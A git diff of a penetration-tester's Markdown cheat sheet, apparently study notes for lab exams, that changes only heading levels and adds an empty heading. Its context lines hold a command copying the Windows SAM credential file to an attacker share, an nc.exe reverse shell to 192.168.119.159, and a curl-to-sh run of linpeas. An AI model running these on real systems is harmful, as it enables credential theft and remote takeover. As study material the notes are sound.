@@ -27,7 +27,7 @@
 4. `copy c:\Windows\Repair\SAM \\MYIP\tools\` copy content to my kali
 5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
- ## Privilege Escalation for Window
+ # Privilege Escalation for Window
  0. Use PowerUp
  1. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
  2. `Invoke-AllChecks`
@@ -200,7 +200,7 @@ oLink.Save
 
 
 
-## Privilege Escalation for Linux
+# Privilege Escalation for Linux
 0. `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script (run from cd /tmp)
 1. `chmod +x linpeas.sh` and `./linpeas.sh`
 2. `wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh (use lin enum smart)`
@@ -240,6 +240,8 @@ su
 2.   `ps aux | grep "^root"` show all processes running as root.
 3.   `./lse.sh -i -l 1`and see services running with root
 4.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.
+
+### Sudo exploit
 
 ### Kernal exploit (last resort)
 1.  https://www.exploit-db.com/exploits/44298 (check this one out :) )
